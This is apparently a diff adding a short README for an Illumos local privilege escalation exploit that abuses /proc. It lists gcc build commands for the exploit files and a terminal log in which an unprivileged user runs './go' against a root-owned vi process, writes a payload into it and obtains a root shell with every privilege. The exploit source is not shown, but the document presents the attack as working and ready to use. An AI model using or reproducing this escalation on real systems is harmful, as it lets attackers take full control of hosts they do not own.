@@ -1,0 +1,35 @@
+Illumos /proc escalation exploit
+
+
+  gcc -nostdlib -static bash.s -o bash
+  gcc -o go go.c
+
+  root@web01:~# id
+  uid=1000(ben) gid=1(other) groups=1(other)
+
+  root@web01:~# ppriv $$
+  36695:  sh
+  flags = <none>
+    E: basic
+    I: basic
+    P: basic
+    L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
+
+  root@web01:~# ps auxww |grep vi
+  root     36626  0.0  0.2 5012 3344 pts/2    S 21:48:50  0:00 vi /tmp/test
+
+
+  root@web01:~# ./go 36626
+  found syscall: fefe2255
+  file_size: 1464 8046a50
+  write returned: 1464
+  [root@web01 /root]# id
+  uid=0(root) gid=0(root)
+  [root@web01 /root]# ppriv $$
+  36724:  /bin/bash
+  flags = <none>
+    E: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
+    I: basic
+    P: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
+    L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
+
